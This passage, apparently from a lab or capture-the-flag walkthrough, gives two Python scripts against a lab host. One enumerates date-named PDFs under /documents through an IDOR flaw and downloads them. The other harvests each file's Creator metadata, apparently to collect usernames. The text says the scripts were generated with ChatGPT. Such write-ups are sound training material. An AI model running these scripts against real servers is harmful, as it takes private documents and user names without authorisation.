Browse to the web application to identify an endpoint called /documents that stores PDFs. The filenames are in the following format:

YYYY-MM-DD-upload.pdf
YYYY-MM-DD-upload.pdf

Using ChatGPT, we can quickly create an IDOR mass enumeration script that downloads the available files:

import requests
from datetime import datetime, timedelta

# Base URL where the files are hosted
base_url = "http://10.129.68.23/documents"

# Start and end dates for the search range
start_date = datetime(2020, 1, 1)
end_date = datetime(2020, 12, 31)

# Current date for iteration
current_date = start_date

while current_date <= end_date:
    # Generate the filename in YYYY-MM-DD-upload.pdf format
    filename = current_date.strftime("%Y-%m-%d-upload.pdf")
    url = f"{base_url}/{filename}"

    # Perform a HEAD request to check if the file exists
    response = requests.head(url)

    if response.status_code == 200:
        print(f"Found: {url}")
        
        # Perform a GET request to download the file
        file_response = requests.get(url)
        
        # Save the content of the file to a local file
        with open(filename, "wb") as f:
            f.write(file_response.content)
        print(f"Downloaded: {filename}")
    else:
        print(f"File not found: {url}")

    # Move to the next day
    current_date += timedelta(days=1)

import requests
from PyPDF2 import PdfReader
from datetime import datetime, timedelta
from io import BytesIO

# Base URL where the files are hosted
base_url = "http://10.129.68.23/documents"

# Date range
start_date = datetime(2020, 1, 1)
end_date = datetime(2020, 12, 31)

# Open output text file
with open("pdf_creators.txt", "w", encoding="utf-8") as output_file:
    current_date = start_date

    while current_date <= end_date:
        filename = current_date.strftime("%Y-%m-%d-upload.pdf")
        url = f"{base_url}/{filename}"

        # Check if file exists
        head_response = requests.head(url)

        if head_response.status_code == 200:
            print(f"Found: {url}")

            try:
                # Download PDF into memory
                get_response = requests.get(url, timeout=10)
                get_response.raise_for_status()

                pdf_stream = BytesIO(get_response.content)

                # Read PDF metadata
                reader = PdfReader(pdf_stream)
                metadata = reader.metadata

                # Extract Creator metadata
                creator = metadata.get("/Creator", "Unknown")

                # Save to text file
                output_file.write(f"{creator}\n")
                print(f"Saved Creator for: {filename}")

            except Exception as e:
                print(f"Error processing {filename}: {e}")

        else:
            print(f"Not found: {url}")

        current_date += timedelta(days=1)

print("Creator metadata extraction complete.")
